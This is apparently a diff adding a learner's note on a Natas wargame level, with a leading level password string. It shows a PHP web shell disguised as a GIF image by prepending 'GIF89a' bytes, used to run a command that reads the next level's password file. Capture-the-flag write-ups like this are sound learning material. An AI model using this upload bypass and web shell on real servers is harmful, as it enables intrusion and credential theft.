@@ -1,0 +1,9 @@
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+so I had to edit the first few bytes of the php file so that i would trick the server that it was an image lemme paste the php file
+
+GIF89a //the image bytes
+<?php system('cat /etc/natas_webpass/natas14') ?>
+
+That's how I got in
+
